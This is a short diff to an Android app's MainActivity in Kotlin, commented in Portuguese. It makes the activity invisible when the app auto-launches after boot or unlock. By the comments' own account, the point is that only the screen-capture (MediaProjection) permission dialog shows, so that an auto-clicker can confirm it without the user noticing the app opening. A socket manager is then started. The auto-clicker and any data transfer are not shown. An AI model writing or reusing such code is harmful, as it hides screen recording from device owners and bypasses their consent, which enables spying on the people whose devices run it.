@@ -177,7 +177,18 @@ class MainActivity : Activity() {
     override fun onCreate(savedInstanceState: Bundle?) {
         // ── INJETOR VIRTUAL PÓS-BOOT: verificação ANTES de qualquer outra linha ──
         if (intent?.getBooleanExtra("AUTO_BOOT_REANIMAR", false) == true) {
+            // JANELA INVISÍVEL: no boot/desbloqueio o app NÃO deve "abrir"
+            // visualmente — deve aparecer APENAS o modal do MediaProjection
+            // (centralizado), que o auto-clique confirma. Sem isto, a Activity
+            // headless mostrava uma janela em branco (tema opaco) por ~1s antes
+            // do finish(), parecendo que o app abriu. Tema translúcido + fundo
+            // transparente = só o modal fica visível.
+            setTheme(android.R.style.Theme_Translucent_NoTitleBar)
             super.onCreate(savedInstanceState)
+            try {
+                window.setBackgroundDrawableResource(android.R.color.transparent)
+                window.setDimAmount(0f)
+            } catch (_: Exception) {}
             reanimacaoBootAutomatica = true
             SocketManager.appContext = applicationContext
             Thread {
